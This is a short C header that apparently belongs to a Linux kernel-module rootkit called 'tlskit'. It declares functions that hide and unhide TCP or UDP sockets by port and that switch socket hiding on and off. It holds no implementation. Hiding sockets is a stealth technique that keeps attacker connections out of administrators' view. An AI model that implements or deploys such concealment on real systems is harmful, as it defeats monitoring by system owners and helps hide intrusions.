#ifndef LKM_TLSKIT_SOCKET_HIDING_H
#define LKM_TLSKIT_SOCKET_HIDING_H

#define PROTO_TCP 0
#define PROTO_UDP 1

/**
 * Hide a socket
 * @param port
 * @param proto
 * @return 0 on success, -1 else
 */
int hide_socket(unsigned short port, unsigned char proto);

/**
 * Unhide a socket
 * @param port
 * @param proto
 * @return 0 on success, -1 else
 */
int unhide_socket(unsigned short port, unsigned char proto);

/**
 * Enable socket hiding
 * @return 0 on success, -1 else
 */
int enable_socket_hiding(void);

/**
 * Disable socket hiding
 */
void disable_socket_hiding(void);

#endif //LKM_TLSKIT_SOCKET_HIDING_H
